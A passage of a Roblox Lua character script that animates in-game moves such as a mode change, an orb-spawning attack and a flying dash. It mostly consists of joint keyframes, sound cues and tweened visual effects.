CFrame = RootPart.CFrame*CFrame.new(0,0+thing,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = RootPart.CFrame*CFrame.new(0,0+thing,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.new(.5,0,0),
EndColor = Color3.new(1,0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(60,60,60),
Material = "Neon",
Reflectance = 0,
}
)
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = .35,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(.5,.5,.5),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(80,1,80),
Material = "Neon",
Reflectance = 0,
}
)
end
if rdm ~= 1 then
ModeOfCharacter = "Resolute"
songnameboi = "Tristam - Till It's Over (HEXAGONEST REMIX)"
else
ModeOfCharacter = "Determined"
songnameboi = "Tristam - Till It's Over"
end

attack = false
hum.WalkSpeed = storehumanoidWS


end


function Tears(val)
for i,v in pairs(EyesFolder:GetChildren()) do
if v.Name == "Tear" then
if val == true then
v.Transparency = .35
else
v.Transparency = 1
end
end
end
end


local Heart = script.BrokenHeart
for i,v in pairs(Heart:GetChildren()) do
v.Anchored = false
end
local HeartWeld = Instance.new("Weld",tors)
HeartWeld.Part0 = Heart.WeldPart
HeartWeld.Part1 = tors
HeartWeld.C0 = cf(0,-.7,1)
function HeartTrans(trans)
for i,v in pairs(Heart:GetChildren()) do
if v.Name ~= "WeldPart" then
v.Transparency = trans
end
if v:FindFirstChild("ParticleEmitter") then
if trans > .6 then
v.ParticleEmitter.Enabled = false
else
v.ParticleEmitter.Enabled = true
end
end
end
end


local TrAttach = script.Effects.TransAttach.TransformAttachment
TrAttach.Parent = tors

function ModeChangeEnable(val,modecol1,modecol2)
if not val then
for i,v in pairs(TrAttach:GetChildren()) do
v.Enabled = val
end
else --value is true
for i,v in pairs(TrAttach:GetChildren()) do
v.Enabled = val
if v.Name == "ParticleEmitter" then
v.Color = ColorSequence.new(modecol1,modecol1)
elseif v.Name == "ParticleEmitter2" then
v.Color = ColorSequence.new(modecol2,modecol2)
end
end
end
end

function ModeChangeStart(modecol1,modecol2)
ModeChangeEnable(true,modecol1,modecol2)
hum.WalkSpeed = 0
attack = true

--local easingstyle = Enum.EasingStyle.Linear
--local easingdir = Enum.EasingDirection.In
--local animatetime = .01
--Animate(RootJoint,cf(0,0,0)*angles(math.rad(0),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
--Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
--Animate(RH,cf(1,-1,0)*angles(math.rad(0),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
--Animate(LW,cf(-1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir)
--Animate(RW,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir)
--Animate(Torso.Neck,necko*angles(math.rad(-0),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)




local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .12
Animate(RootJoint,cf(0,0,0)*angles(math.rad(0),math.rad(14.4),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(2.6),math.rad(22.1),math.rad(-6.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0),math.rad(-19.8),math.rad(2.3))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.6,0)*angles(math.rad(10.2),math.rad(-1),math.rad(-16.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.8,0.6,-1.2)*angles(math.rad(115.2),math.rad(-35.5),math.rad(-61.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-3.3),math.rad(0.7),math.rad(-12.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

end
function ModeChangeEnd()
hum.WalkSpeed = 0
soundeffect(320983830,math.random(7,11)/10,tors,9,0,"bang")
soundeffect(3750937866,math.random(5,9)/10,tors,10,0,"magical bless")
ModeChangeEnable(false)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .31
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-3.1),math.rad(14.4),math.rad(0.8))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(5.7),math.rad(21.7),math.rad(-8.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.1,0)*angles(math.rad(8.3),math.rad(-19.3),math.rad(5.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.5,0.2)*angles(math.rad(-1.9),math.rad(23.1),math.rad(-5.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.5,0.2)*angles(math.rad(105.3),math.rad(0.8),math.rad(92.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(4.8),math.rad(-1.1),math.rad(-12.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .3
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-3.1),math.rad(14.4),math.rad(0.8))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(5.7),math.rad(21.7),math.rad(-8.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.1,0)*angles(math.rad(8.3),math.rad(-19.3),math.rad(5.1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.5,0.2)*angles(math.rad(-1.9),math.rad(23.1),math.rad(-5.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.5,0.2)*angles(math.rad(105.3),math.rad(0.8),math.rad(92.9)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(4.8),math.rad(-1.1),math.rad(-12.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
attack = false
hum.WalkSpeed = storehumanoidWS

end


function HostileIntroStart()
attack = true
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,-0.4,0)*angles(math.rad(-11.3),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.5,-0.3)*angles(math.rad(0),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.7)*angles(math.rad(14.8),math.rad(0),math.rad(2.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.7,0.2)*angles(math.rad(10.8),math.rad(24.1),math.rad(-25)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.7,0.1)*angles(math.rad(7.4),math.rad(-13.6),math.rad(28.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(13.2),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .4
Animate(RootJoint,cf(0,2,0)*angles(math.rad(14.8),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.9,-0.3)*angles(math.rad(-11.4),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,0.2,-0.7)*angles(math.rad(-23.2),math.rad(-1.7),math.rad(2.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.2,0)*angles(math.rad(-5.5),math.rad(0.6),math.rad(-11.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.2,0.1)*angles(math.rad(-19.8),math.rad(1.4),math.rad(5.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-17.6),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
delay(.1,function()

DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = .15,
EasingStyle = "Back",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
EndCFrame = RootPart.CFrame*CFrame.new(0,-3.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(0,0,1),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(30,1,30),
Material = "Neon",
Reflectance = 0,
}
)
for i = 0,10 do
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = .4,
EasingStyle = "Sine",
EasingDirection = "In",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
EndCFrame = RootPart.CFrame*CFrame.new(0,0,0)*CFrame.Angles(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360))),
Color = Color3.new(1, 1, 0),
EndColor = Color3.new(1, 1, 1),
Transparency = 1,
EndTrans = 0,
Size = Vector3.new(40,40,40),
EndSize = Vector3.new(1,1,1),
Material = "Neon",
Reflectance = 0,
}
)
end

end)
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .25
Animate(RootJoint,cf(0,2,0)*angles(math.rad(-27.9),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.9,-0.3)*angles(math.rad(45.1),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.7)*angles(math.rad(1.7),math.rad(-0.6),math.rad(2.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.6,0.2,-0.5)*angles(math.rad(15.9),math.rad(19.3),math.rad(102.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.6,0.2,-0.9)*angles(math.rad(168.4),math.rad(-4.8),math.rad(-86.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(36.8),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--attack = false
end

function SpawnOrb(OrbColor,CanCollide,Pos,Size,InstantKill,EffectsEnabled,TimeBeforeExplode,CustomColor)
local CurrentlyDoing = true


local Orb = Instance.new("Part",FXFolder)
local OrbMesh = Instance.new("SpecialMesh",Orb)
OrbMesh.MeshType = Enum.MeshType.Sphere
coroutine.resume(coroutine.create(function()

while true do
swait()
if CurrentlyDoing == true then
if CustomColor == "Rainbow" then
Orb.Color = Color3.fromHSV(boop(counter),1,1)
elseif CustomColor == "Random" then
Orb.Color = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
else
Orb.Color = OrbColor
end
else
--It's currently not doing the colors
end

end

end))
Orb.Anchored = true
Orb.CanCollide = CanCollide
Orb.Position = Pos
Orb.Size = Size
Orb.Material = "Neon"
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = Orb.CFrame,
EndCFrame = Orb.CFrame,
Color = OrbColor,
EndColor = OrbColor,
Transparency = 0,
EndTrans = 1,
Size = Orb.Size/2,
EndSize = Orb.Size*2,
Material = "Neon",
Reflectance = 0,
}
)
if EffectsEnabled then

local bababooey = Orb.Size.Y/2
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = 2,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = Orb.CFrame*CFrame.new(0,-bababooey,0),
EndCFrame = Orb.CFrame*CFrame.new(0,-bababooey,0),
Color = Color3.new(1,1,1),
EndColor = Color3.new(0,0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(Orb.Size.X,.1,Orb.Size.Z),
EndSize = Vector3.new(Orb.Size.X*4,.2,Orb.Size.Z*4),
Material = "Neon",
Reflectance = 0,
}
)
end
delay(TimeBeforeExplode-.3,function()
local SecondOrb = Orb:Clone()
SecondOrb.Parent = Orb.Parent
Orb.Transparency = 1
local easestyle = Enum.EasingStyle.Back
local easedirect = Enum.EasingDirection.InOut
local info = TweenInfo.new(.5,easestyle,easedirect,0,false,0)
local actualanim = game:GetService("TweenService"):Create(SecondOrb,info,{Size=Vector3.new(SecondOrb.Size.X/10,SecondOrb.Size.Y/10,SecondOrb.Size.Z/10)})
actualanim:Play()
wait(.5)
SecondOrb:Destroy()

end)

delay(TimeBeforeExplode,function()
CurrentlyDoing = false
if EffectsEnabled then
for i = 0,10 do

local rdm1 = math.random(-360,360)
local rdm2 = math.random(-360,360)
local rdm3 = math.random(-360,360)
--these local variables are to make sure it stays in the same position both before and after the effect.

DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = .5,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = Orb.CFrame*CFrame.Angles(math.rad(rdm1),math.rad(rdm2),math.rad(rdm3)),
EndCFrame = Orb.CFrame*CFrame.Angles(math.rad(rdm1),math.rad(rdm2),math.rad(rdm3)),
Color = OrbColor,
EndColor = OrbColor,
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(Orb.Size.X/5,Orb.Size.Y*7,Orb.Size.Z/5),
Material = "Neon",
Reflectance = 0,
}
)
end
end
DerpzEff("Sphere",
{
--Put tween info here, Don't use TweenInfo
Time = .75,
EasingStyle = "Sine",
EasingDirection = "Out",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = Orb.CFrame,
EndCFrame = Orb.CFrame,
Color = OrbColor,
EndColor = OrbColor,
Transparency = 0,
EndTrans = 1,
Size = Orb.Size,
EndSize = Orb.Size*4,
Material = "Neon",
Reflectance = 0,
}
)
Orb:Destroy()




end)

end

function OrbMadness()
attack = true
hum.WalkSpeed = 0
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .25
Animate(RootJoint,cf(0,0,0.1)*angles(math.rad(2.6),math.rad(-11.3),math.rad(0.5))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1.1,-0.6)*angles(math.rad(-9.2),math.rad(11.5),math.rad(2.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(-13.5),math.rad(-2.6),math.rad(5.2))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,1.2,0.4)*angles(math.rad(84.4),math.rad(-46.2),math.rad(-90.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,1.2,0.6)*angles(math.rad(99.3),math.rad(51.9),math.rad(88.1)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(24.9),math.rad(6.7),math.rad(14.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

--actual attack is here
DerpzEff("Block",
{
--Put tween info here, Don't use TweenInfo
Time = 1,
EasingStyle = "Back",
EasingDirection = "In",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = RootPart.CFrame,
EndCFrame = RootPart.CFrame*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(.5,.5,.5),
Transparency = .2,
EndTrans = 1,
Size = Vector3.new(10,9999,10),
EndSize =Vector3.new(1,9999,1),
Material = "Neon",
Reflectance = 0,
}
)
local rem = Instance.new("Part", char)
rem.Anchored = true
rem.CanCollide = false
rem.FormFactor = 3
rem.Name = "PartThing"
rem.Material = "Neon"
rem.Size = Vector3.new(1, 1, 1)
rem.Transparency = 1
rem.TopSurface = 0
rem.BottomSurface = 0
rem.CFrame = root.CFrame*CFrame.new(0,-2.5,0)
local lookv = math.random(5,15)
local rot = 0
coroutine.resume(coroutine.create(function()
for i = 0, 20 do
swait(4)
rot = 360/15
lookv = lookv + 1
rem.CFrame = rem.CFrame*CFrame.Angles(0,math.rad(rot),0)
SpawnOrb(Color3.new(1,1,1),false,(rem.CFrame + rem.CFrame.LookVector*lookv).Position,Vector3.new(1,1,1),false,false,2.5,"nothing lol")
end
rem:Destroy()
end))

--SpawnOrb(Color3.new(1,1,1),false,RootPart.CFrame*CFrame.new(0,-1,-5).Position,Vector3.new(1.5,1.5,1.5),false,true,2.5,"nothing lol")
--SpawnOrb(Color3.new(1,1,1),false,RootPart.CFrame*CFrame.new(-5,-1,0).Position,Vector3.new(1.5,1.5,1.5),false,true,2.5,"nothing lol")
--SpawnOrb(Color3.new(1,1,1),false,RootPart.CFrame*CFrame.new(0,-1,5).Position,Vector3.new(1.5,1.5,1.5),false,true,2.5,"nothing lol")
--SpawnOrb(Color3.new(1,1,1),false,RootPart.CFrame*CFrame.new(5,-1,0).Position,Vector3.new(1.5,1.5,1.5),false,true,2.5,"nothing lol")
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .25
Animate(RootJoint,cf(0,0,0.1)*angles(math.rad(2),math.rad(46.1),math.rad(0.7))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.4,-1.1,-0.2)*angles(math.rad(6.8),math.rad(23.4),math.rad(-5.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1.1,0.1)*angles(math.rad(0),math.rad(-42.1),math.rad(2.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-0.4,0.4,-0.7)*angles(math.rad(87.2),math.rad(4.3),math.rad(103.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(0.6,-0.2,-0.6)*angles(math.rad(99.9),math.rad(8.1),math.rad(-69.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(22.5),math.rad(-14.4),math.rad(-48.3)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
attack = false
end




function FlyMode()
attack = true
soundeffect(SoundTable["ModeChange Explosions"][math.random(1,#SoundTable["ModeChange Explosions"])],1,tors,10,0,"boom")
CamShakeAll2({
Duration=1; -- Lasts for .1 seconds
Intensity=3, -- Intensity of 5
Position=Vector3.new(2,2,2); -- What axises the shake effects and how much (position)
Rotation=Vector3.new(2,2,6); -- What axises the shake effects and how much (rotation)
DropDist=50; -- Camera dist from origin when the shake starts to gradually get weaker
IneffectiveDist=150; -- Camera dist from origin when the shake goes away
Origin=char["Torso"].Position; -- Where the shake is coming from (Part, CFrame, or Vector3)
})
DerpzEff("ShockwaveTestThingy",
{
--Put tween info here, Don't use TweenInfo
Time = 3,
EasingStyle = "Sine",
EasingDirection = "InOut",
RepeatCount = 0,
Reverses = false,



},
--TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
{
CFrame = Torso.CFrame*CFrame.new(0,-2,0)*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
EndCFrame = Torso.CFrame*CFrame.new(0,-2,0)*CFrame.Angles(math.rad(0),math.rad(math.random(-360,360)),math.rad(0)),
Color = Color3.new(1,1,1),
EndColor = Color3.new(0,0,0),
Transparency = 0,
EndTrans = 1,
Size = Vector3.new(0,0,0),
EndSize = Vector3.new(100,7.5,100),
Material = "Neon",
Reflectance = 0,
}
)
local e = Instance.new("BodyVelocity",RootPart)
e.MaxForce = Vector3.new(9999999,9999999,9999999)
e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(60),0,0)).LookVector * 250
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .4
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-23),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.1,-1.1)*angles(math.rad(-30.7),math.rad(0),math.rad(-4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1.2,0.1)*angles(math.rad(-18.6),math.rad(0),math.rad(4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.7,0.2)*angles(math.rad(-3.5),math.rad(33.2),math.rad(-19.1)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.7,0.1)*angles(math.rad(-15),math.rad(-13.7),math.rad(15.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-25.3),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(40),0,0)).LookVector * 200
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .2
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-93.6),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.1,-1.1)*angles(math.rad(-15.8),math.rad(-0.9),math.rad(-3.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.9,-0.1,-0.3)*angles(math.rad(21.5),math.rad(2.4),math.rad(2.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,1,0)*angles(math.rad(54.4),math.rad(0.1),math.rad(-35.4)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1,-0.1)*angles(math.rad(64.5),math.rad(12.5),math.rad(15)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(31.3),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(25),0,0)).LookVector * 150
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .25
Animate(RootJoint,cf(0,0,0)*angles(math.rad(143.4),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.1,-1.1)*angles(math.rad(-15.8),math.rad(-0.9),math.rad(-3.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(0.9,-0.1,-0.3)*angles(math.rad(21.5),math.rad(2.4),math.rad(2.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0.6,-0.5)*angles(math.rad(54.4),math.rad(0.1),math.rad(38.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.3,0.8,-0.5)*angles(math.rad(48.8),math.rad(22.5),math.rad(-31.2)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(35.3),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(15),0,0)).LookVector * 100
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .25
Animate(RootJoint,cf(0,0,0)*angles(math.rad(1.2),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,0.4,-0.9)*angles(math.rad(-28.8),math.rad(4),math.rad(-5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-0.5,-0.4)*angles(math.rad(-5.2),math.rad(-4),math.rad(0))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.3,0.8,0.1)*angles(math.rad(12.1),math.rad(5.8),math.rad(-46.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.8,0)*angles(math.rad(-4.7),math.rad(-4),math.rad(44.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-1.2),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)



e.Velocity = (RootPart.CFrame*CFrame.Angles(math.rad(0),0,0)).LookVector * 200
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .5
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-82.4),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.8,-0.2)*angles(math.rad(-8.7),math.rad(9.1),math.rad(-4.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,0.2,-0.7)*angles(math.rad(-10),math.rad(-9.2),math.rad(5.9))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.5,0.2)*angles(math.rad(-7),math.rad(24.4),math.rad(-25.2)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.6,0.2)*angles(math.rad(-3.9),math.rad(-21),math.rad(20.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(-46.3),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
e:Destroy()
local faster = 0
local fast = 0
repeat
i = 0
faster = faster + 0.001
fast = fast + faster
RootPart.Anchored = true
RootPart.CFrame=RootPart.CFrame:lerp(CFrame.new(RootPart.Position,mouse.Hit.p)*CFrame.new(0,0,-10-(i/15)),.4)
swait()
local Alpha = .15
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(-82.4),math.rad(0 + root.RotVelocity.Y/1.5),math.rad(0))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-0.8,-0.2)*angles(math.rad(-8.7),math.rad(9.1),math.rad(-4.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,0.2,-0.7)*angles(math.rad(-10),math.rad(-9.2),math.rad(5.9))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.5,0.5,0.2)*angles(math.rad(-7),math.rad(24.4),math.rad(-25.2)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.5,0.6,0.2)*angles(math.rad(-3.9),math.rad(-21),math.rad(20.6)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(-46.3),math.rad(0),math.rad(0)),Alpha)
until hitfloor ~= nil
RootPart.Velocity = Vector3.new(0,0,0)
RootPart.Anchored = false
wait(.1)
RootPart.Anchored = true
soundeffect(241486297,0.95,tors,10,0,"Land sfx")
soundeffect(268933841,1.1,tors,10,0,"Land sfx")
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .45
Animate(RootJoint,cf(0,-0.8,-0.7)*angles(math.rad(-45.8),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-0.2,-1.2)*angles(math.rad(-16.9),math.rad(0),math.rad(0))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
